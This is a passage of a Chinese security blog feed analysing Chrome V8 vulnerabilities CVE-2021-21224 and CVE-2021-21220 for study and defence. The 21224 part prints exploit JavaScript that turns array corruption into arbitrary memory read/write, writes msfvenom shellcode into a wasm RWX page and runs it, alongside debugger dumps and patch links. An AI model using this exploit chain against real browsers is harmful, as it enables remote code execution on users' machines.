class="line">...</span><br><span class="line"></span><br><span class="line"><span class="attr">DebugPrint</span>: <span class="number">0xda708098015</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x0da7082439c9</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0da70820b959</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x0da708098009</span> &lt;FixedArray[<span class="number">67244566</span>]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: -<span class="number">1</span></span><br><span class="line"> - properties: <span class="number">0x0da70804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0xda7080446c1</span>: [<span class="built_in">String</span>] <span class="keyword">in</span> ReadOnlySpace: #length: <span class="number">0x0da70818215d</span> &lt;AccessorInfo&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0da708098009</span> &lt;FixedArray[<span class="number">67244566</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">4386</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">0x0da7082439c9</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x0da70804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x0da708098009</span> &lt;FixedArray[<span class="number">67244566</span>]&gt;</span><br><span class="line">           <span class="number">4</span>: -<span class="number">1</span></span><br><span class="line">           <span class="number">5</span>: <span class="number">0x0da708042205</span> &lt;<span class="built_in">Map</span>&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">2</span></span><br><span class="line">         <span class="number">7</span>-<span class="number">8</span>: <span class="number">0x0da70804242d</span> &lt;the_hole&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">0x0da708243a19</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line">          <span class="number">10</span>: <span class="number">0x0da70804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x0da708098049</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt;</span><br><span class="line">          <span class="number">12</span>: <span class="number">2</span></span><br><span class="line">          <span class="number">13</span>: <span class="number">0x0da7080422c5</span> &lt;<span class="built_in">Map</span>[<span class="number">4</span>]&gt;</span><br><span class="line">          <span class="number">14</span>: <span class="number">0x0da708042a95</span> &lt;<span class="built_in">Map</span>&gt;</span><br><span class="line">          <span class="number">15</span>: <span class="number">2</span></span><br><span class="line">          <span class="number">16</span>: <span class="number">858993459</span></span><br><span class="line">          <span class="number">17</span>: <span class="number">537539379</span></span><br><span class="line">Received signal <span class="number">11</span> SEGV_ACCERR 0da7fff7fffc</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由上面的结果可以推算出(0xda708098035-0x0da708098009)/4 -&gt; 0x2c/4 -&gt; 11，所以corrupt_arr偏移11的位置为rwarr的map，那么corrupt_arr偏移12的位置处为rwarr的length（具体内存结构可以通过动态调试来获取）。</p><p>那么我们修改rwarr的length语句则为，之后销毁那个被损坏的数组对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">corrupt_arr[<span class="number">12</span>] = <span class="number">0x22444</span>;</span><br><span class="line"><span class="keyword">delete</span> corrupt_arr;  </span><br></pre></td></tr></table></figure><p>之后我们的相对内存读写通过这个未被损坏的数组进行操作。接下来构造两个函数，实现如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setbackingStore</span>(<span class="params">hi, low</span>) </span>&#123;</span><br><span class="line">    rwarr[<span class="number">4</span>] = i2f(f2i(rwarr[<span class="number">4</span>]), hi);</span><br><span class="line">    rwarr[<span class="number">5</span>] = i2f(low, f4i(rwarr[<span class="number">5</span>]));              <span class="comment">//给corrupt_buff的backing_store属性赋值，backing_store：0xb7080d6fc4（8位）、rwarr[4]：0xb7080d6fc0（8位）、rwarr[5]：0xb7080d6fc8（8位）</span></span><br><span class="line">&#125; <span class="function"><span class="keyword">function</span> <span class="title">leakObjLow</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">    corrupt_buff.slot = o;</span><br><span class="line">    <span class="keyword">return</span> (f2i(rwarr[<span class="number">9</span>]) - <span class="number">1</span>);                      <span class="comment">//因为采用了地址压缩，所以当前内存中只存取了低四字节地址。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leakObjLow主要是为了泄露低地址的值，由于采用了地址压缩，所以当前内存中只存取了低四字节地址。内存如下（rwarr[9]为slot的内存，rwarr[4]的高地址和rwarr[5]的低地址为corrupt_buff的backing_store属性值，通过恶意DataView对象对backing_store进行操作，即可完成任意地址读写）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x0766080e8099-1 rwarr_addr</span><br><span class="line">00:0000│  0x766080e8098 ◂— 0x408042a95</span><br><span class="line">01:0008│  0x766080e80a0 ◂— 0x4014666666666666rwarr[0]</span><br><span class="line">02:0010│  0x766080e80a8 ◂— 0xfff7fffffff7ffff</span><br><span class="line">03:0018│  0x766080e80b0 ◂— 0x804222d08247231</span><br><span class="line">04:0020│  0x766080e80b8 ◂— 0x10000804222d</span><br><span class="line">05:0028│  0x766080e80c0 ◂— 0xec3bfdf000000000rwarr[4]</span><br><span class="line">06:0030│  0x766080e80c8 ◂— 0xec3bfdc0000055fdrwarr[5]</span><br><span class="line">07:0038│  0x766080e80d0 ◂— 0x2000055fd</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x766080e80b1-1 corrupt_buff_addr</span><br><span class="line">00:0000│  0x766080e80b0 ◂— 0x804222d08247231</span><br><span class="line">01:0008│  0x766080e80b8 ◂— 0x10000804222d</span><br><span class="line">02:0010│  0x766080e80c0 ◂— 0xec3bfdf000000000</span><br><span class="line">03:0018│  0x766080e80c8 ◂— 0xec3bfdc0000055fd</span><br><span class="line">04:0020│  0x766080e80d0 ◂— 0x2000055fd</span><br><span class="line">05:0028│  0x766080e80d8 ◂— 0x0</span><br><span class="line">06:0030│  0x766080e80e0 ◂— 0x0</span><br><span class="line">07:0038│  0x766080e80e8 ◂— 0x80422050001667erwarr[9]</span><br><span class="line">08:0040│  0x766080e80f0 ◂— 0x80e806500000006</span><br><span class="line"></span><br><span class="line">─</span><br><span class="line">pwndbg&gt; job 0x766080e80b1</span><br><span class="line">       18-19: [weak] 0x0766fff7fffd 0x766080e80b1: [JSArrayBuffer]</span><br><span class="line"> - map: 0x076608247231 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x07660818cb45 &lt;LeakArrayBuffer map = 0x76608247209&gt;</span><br><span class="line"> - elements: 0x07660804222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store: 0x55fdec3bfdf0</span><br><span class="line"> - byte_length: 4096</span><br><span class="line"> - detachable</span><br><span class="line"> - properties: 0x07660804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x76608212b89: [String] in OldSpace: #slot: 45887 (const data field 0), location: in-object</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>不过到目前为止我们只获得了低四位的地址，并不能进行绝对地址写，我们需要获得当前空间的高四位基址，可以通过以下的代码进行实现，最终得到的this.base为基址。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里采用了地址压缩，定位基址的采用了通过rwarr访问baseAddr的方式</span></span><br><span class="line">   <span class="keyword">let</span> corrupt_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(corrupt_buff);                  <span class="comment">//通过corrupt_view操作corrupt_buff的backing_store属性进行任意地址读写。</span></span><br><span class="line">   <span class="keyword">let</span> corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);                         <span class="comment">//corrupt_buffer_ptr： 0x103082f18a1 ，corrupt_buffer_ptr_low： 0x82f18a0</span></span><br><span class="line">   <span class="keyword">let</span> idx0Addr = corrupt_buffer_ptr_low - <span class="number">0x10</span>;                                                                               <span class="comment">//rwarr[0]的位置： 0x82f1890</span></span><br><span class="line">   <span class="keyword">let</span> baseAddr = (corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) - ((corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) % <span class="number">0x40000</span>) + <span class="number">0x40000</span>;         <span class="comment">//获得基址： 0x8300000   0x82f0000-0x30000+0x40000    </span></span><br><span class="line">   <span class="keyword">let</span> delta = baseAddr + <span class="number">0x1c</span> - idx0Addr;                       <span class="comment">//0xe78c  ,rwarr[0]距离目标的实际大小</span></span><br><span class="line">   <span class="keyword">if</span> ((delta % <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">       <span class="keyword">let</span> baseIdx = delta / <span class="number">8</span>;</span><br><span class="line">       <span class="built_in">this</span>.base = f2i(rwarr[baseIdx]);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">let</span> baseIdx = ((delta - (delta % <span class="number">8</span>)) / <span class="number">8</span>);                <span class="comment">//0x1cf1</span></span><br><span class="line">       <span class="built_in">this</span>.base = f4i(rwarr[baseIdx]);                          <span class="comment">//0x103</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>最终可以通过setbackingStore操作地址进行任意地址读写，泄露出rwx地址并写入shellcode，最终执行shellcode</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasmInsAddr = leakObjLow(wasmInstance);    setbackingStore(wasmInsAddr, <span class="built_in">this</span>.base);                           <span class="keyword">let</span> rwx_page_addr = corrupt_view.getFloat64(<span class="number">0x68</span>, <span class="literal">true</span>);      <span class="comment">//获得rwx_page_addr,在偏移0x68的位置上    setbackingStore(f2i(rwx_page_addr), f4i(rwx_page_addr));    for (let i = 0; i &lt; shellcode.length; i++) &#123;        corrupt_view.setUint8(i, shellcode[i]);    &#125;    f();</span></span><br></pre></td></tr></table></figure><p>使用的shellcode如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msfvenom -p linux/x64/exec CMD=&quot;echo pwn&quot; -f num exitfunc=thread -a x64    let shellcode = [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x09, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x70, 0x77, 0x6e, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05];</span></span><br></pre></td></tr></table></figure><p>最终复现结果如下</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210510163239760.png" alt="image-20210510163239760"></p><h3 id="3、漏洞修复"><a href="#3、漏洞修复" class="headerlink" title="3、漏洞修复"></a>3、漏洞修复</h3><p>issue 1195777</p><p><a class="link"   href="https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html" >https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html<i class="fas fa-external-link-alt"></i></a></p><h2 id="四、总结与思考"><a href="#四、总结与思考" class="headerlink" title="四、总结与思考"></a>四、总结与思考</h2><p>该漏洞为CVE-2021-21220的exp公开不久后公布的，是2021HW中的两枚重磅炸弹，虽然都不可以进行沙箱逃逸，但是仍然可以在一些不开启沙箱的情况下进行使用。该公开的exp的利用手法比较巧妙，通过corrupt_arr修改rwarr数组长度，rwarr具有八字节读写能力，之后通过rwarr相对地址读写可以操作corrupt_buff进而造成任意地址读写</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p>[1]. <a class="link"   href="http://noahblog.360.cn/chromium_v8_remote_code_execution_vulnerability_analysis/" >http://noahblog.360.cn/chromium_v8_remote_code_execution_vulnerability_analysis/<i class="fas fa-external-link-alt"></i></a></p><p>[2]. <a class="link"   href="https://github.com/avboy1337/1195777-chrome0day" >https://github.com/avboy1337/1195777-chrome0day<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;V8远程代码执行漏洞&quot;&gt;&lt;a href=&quot;#V8远程代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;V8远程代码执行漏洞&quot;&gt;&lt;/a&gt;V8远程代码执行漏洞&lt;/h1&gt;&lt;h2 id=&quot;一、漏洞信息&quot;&gt;&lt;a href=&quot;#一、漏洞信息&quot; class=&quot;</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="浏览器" scheme="https://fa1lr4in.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-21220</title>
    <link href="https://fa1lr4in.github.io/2021/04/30/CVE-2021-21220/"/>
    <id>https://fa1lr4in.github.io/2021/04/30/CVE-2021-21220/</id>
    <published>2021-04-30T08:38:26.000Z</published>
    <updated>2022-04-19T09:10:27.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V8远程代码执行漏洞"><a href="#V8远程代码执行漏洞" class="headerlink" title="V8远程代码执行漏洞"></a>V8远程代码执行漏洞</h1><h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1、漏洞简述"><a href="#1、漏洞简述" class="headerlink" title="1、漏洞简述"></a>1、漏洞简述</h3><ul><li>漏洞名称：V8远程代码执行漏洞</li><li>漏洞编号：CVE-2021-21220</li><li>漏洞类型：JIT优化导致可构造超长数组进行任意地址读写</li><li>漏洞影响：远程代码执行</li><li>CVSS3.0：N/A</li><li>CVSS2.0：N/A</li><li>漏洞危害等级：严重</li></ul><h3 id="2、组件和漏洞概述"><a href="#2、组件和漏洞概述" class="headerlink" title="2、组件和漏洞概述"></a>2、组件和漏洞概述</h3><p>V8是Google使用C++编写的开源高性能JavaScript和WebAssembly引擎。它被广泛用于用于Chrome和Node.js等场景中。它实现了ECMAScript和WebAssembly功能。V8既可以在Windows 7及以上版本，macOS 10.12+和使用x64，IA-32，ARM或MIPS处理器的Linux等操作系统上运行。也可以独立运行，还可以嵌入到任何C ++应用程序中。</p><h3 id="3、相关链接"><a href="#3、相关链接" class="headerlink" title="3、相关链接"></a>3、相关链接</h3><p>issue 1196683</p><h3 id="4、解决方案"><a href="#4、解决方案" class="headerlink" title="4、解决方案"></a>4、解决方案</h3><p>Chrome最新版本已经修复，请用户及时更新至最新版本。</p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>安装89.0.4389.90的Chrome浏览器</p><h3 id="2、复现过程"><a href="#2、复现过程" class="headerlink" title="2、复现过程"></a>2、复现过程</h3><p>1、在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。</p><p>2、将漏洞文件拖入浏览器中执行</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210421222934275.png" alt="image-20210421222934275"></p><h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1、基本信息"><a href="#1、基本信息" class="headerlink" title="1、基本信息"></a>1、基本信息</h3><ul><li>漏洞文件：instruction-selector-x64.cc</li><li>漏洞函数：InstructionSelector::VisitChangeInt32ToInt64</li></ul><h3 id="2、背景知识"><a href="#2、背景知识" class="headerlink" title="2、背景知识"></a>2、背景知识</h3><p>(1) js中array-shift实现。</p><p>v8源码版本: V8 version 9.1.0 (candidate)</p><h4 id="（1）array-shift-tq"><a href="#（1）array-shift-tq" class="headerlink" title="（1）array-shift.tq"></a>（1）array-shift.tq</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2019 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> array &#123;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> builtin <span class="title">ArrayShift</span><span class="params">(Context, JSFunction, JSAny, int32)</span>: JSAny;</span></span><br><span class="line"></span><br><span class="line"><span class="function">macro <span class="title">TryFastArrayShift</span><span class="params">(implicit context: Context)</span><span class="params">(receiver: JSAny)</span>: JSAny</span></span><br><span class="line"><span class="function">    labels Slow, Runtime &#123;</span></span><br><span class="line">  <span class="keyword">const</span> array: FastJSArray = Cast&lt;FastJSArray&gt;(receiver) otherwise Slow;</span><br><span class="line">  let witness = <span class="built_in">NewFastJSArrayWitness</span>(array);</span><br><span class="line"></span><br><span class="line">  witness.<span class="built_in">EnsureArrayPushable</span>() otherwise Slow;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (array.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> Undefined;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> newLength = array.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check that we&#x27;re not supposed to right-trim the backing store, as</span></span><br><span class="line">  <span class="comment">// implemented in elements.cc:ElementsAccessorBase::SetLengthImpl.</span></span><br><span class="line">  <span class="keyword">if</span> ((newLength + newLength + kMinAddedElementsCapacity) &lt;</span><br><span class="line">      array.elements.length) &#123;</span><br><span class="line">    <span class="keyword">goto</span> Runtime;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check that we&#x27;re not supposed to left-trim the backing store, as</span></span><br><span class="line">  <span class="comment">// implemented in elements.cc:FastElementsAccessor::MoveElements.</span></span><br><span class="line">  <span class="keyword">if</span> (newLength &gt; kMaxCopyElements) <span class="keyword">goto</span> Runtime;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = witness.<span class="built_in">LoadElementOrUndefined</span>(<span class="number">0</span>);</span><br><span class="line">  witness.<span class="built_in">ChangeLength</span>(newLength);</span><br><span class="line">  witness.<span class="built_in">MoveElements</span>(<span class="number">0</span>, <span class="number">1</span>, Convert&lt;intptr&gt;(newLength));</span><br><span class="line">  witness.<span class="built_in">StoreHole</span>(newLength);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">transitioning macro <span class="title">GenericArrayShift</span><span class="params">(implicit context: Context)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    receiver: JSAny)</span>: JSAny &#123;</span></span><br><span class="line">  <span class="comment">// 1. Let O be ? ToObject(this value).</span></span><br><span class="line">  <span class="keyword">const</span> object: JSReceiver = <span class="built_in">ToObject_Inline</span>(context, receiver);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. Let len be ? ToLength(? Get(O, &quot;length&quot;)).</span></span><br><span class="line">  <span class="keyword">const</span> length: Number = <span class="built_in">GetLengthProperty</span>(object);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. If len is zero, then</span></span><br><span class="line">  <span class="keyword">if</span> (length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// a. Perform ? Set(O, &quot;length&quot;, 0, true).</span></span><br><span class="line">    <span class="built_in">SetProperty</span>(object, kLengthString, Convert&lt;Smi&gt;(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">// b. Return undefined.</span></span><br><span class="line">    <span class="keyword">return</span> Undefined;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4. Let first be ? Get(O, &quot;0&quot;).</span></span><br><span class="line">  <span class="keyword">const</span> first = <span class="built_in">GetProperty</span>(object, Convert&lt;Smi&gt;(<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// 5. Let k be 1.</span></span><br><span class="line">  let k: Number = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 6. Repeat, while k &lt; len</span></span><br><span class="line">  <span class="keyword">while</span> (k &lt; length) &#123;</span><br><span class="line">    <span class="comment">// a. Let from be ! ToString(k).</span></span><br><span class="line">    <span class="keyword">const</span> from: Number = k;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// b. Let to be ! ToString(k - 1).</span></span><br><span class="line">    <span class="keyword">const</span> to: Number = k - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// c. Let fromPresent be ? HasProperty(O, from).</span></span><br><span class="line">    <span class="keyword">const</span> fromPresent: Boolean = <span class="built_in">HasProperty</span>(object, from);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// d. If fromPresent is true, then</span></span><br><span class="line">    <span class="keyword">if</span> (fromPresent == True) &#123;</span><br><span class="line">      <span class="comment">// i. Let fromVal be ? Get(O, from).</span></span><br><span class="line">      <span class="keyword">const</span> fromValue: JSAny = <span class="built_in">GetProperty</span>(object, from);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ii. Perform ? Set(O, to, fromValue, true).</span></span><br><span class="line">      <span class="built_in">SetProperty</span>(object, to, fromValue);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// i. Perform ? DeletePropertyOrThrow(O, to).</span></span><br><span class="line">      <span class="built_in">DeleteProperty</span>(object, to, LanguageMode::kStrict);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// f. Increase k by 1.</span></span><br><span class="line">    k++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 7. Perform ? DeletePropertyOrThrow(O, ! ToString(len - 1)).</span></span><br><span class="line">  <span class="built_in">DeleteProperty</span>(object, length - <span class="number">1</span>, LanguageMode::kStrict);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 8. Perform ? Set(O, &quot;length&quot;, len - 1, true).</span></span><br><span class="line">  <span class="built_in">SetProperty</span>(object, kLengthString, length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 9. Return first.</span></span><br><span class="line">  <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://tc39.github.io/ecma262/#sec-array.prototype.shift</span></span><br><span class="line"><span class="function">transitioning javascript builtin <span class="title">ArrayPrototypeShift</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    js-implicit context: NativeContext, receiver: JSAny)</span><span class="params">(...arguments)</span>: JSAny &#123;</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">TryFastArrayShift</span>(receiver) otherwise Slow, Runtime;</span><br><span class="line">  &#125; label Slow &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GenericArrayShift</span>(receiver);</span><br><span class="line">  &#125; label Runtime &#123;</span><br><span class="line">    <span class="function">tail <span class="title">ArrayShift</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        context, LoadTargetFromFrame(), Undefined,</span></span></span><br><span class="line"><span class="params"><span class="function">        Convert&lt;int32&gt;(arguments.length))</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shift函数首先会判断数组的长度是否为0，如果为0，则不会对该数组进行修改；如果不为0，则会将最前面的数组元素pop，之后对<strong>数组长度减一</strong>。当然这里会有是否进行快速shift的选择[7]，由于不管是否进行快速shift都不会影响这个操作结果，所以具体快速shift如何对速度进行优化不在我们的考虑范围内。</p><h4 id="（2）smi"><a href="#（2）smi" class="headerlink" title="（2）smi"></a>（2）smi</h4><p>smi在js中为小整数，详见[5]，链接中讲述了v8中不同数据类型的实现。</p><p>smi类型中的-1，0，1在内存中的表示如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x3c6c0808846d</span><br><span class="line">0x3c6c0808846d: [JSArray]</span><br><span class="line"> - map: 0x3c6c08243951 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3c6c0820b959 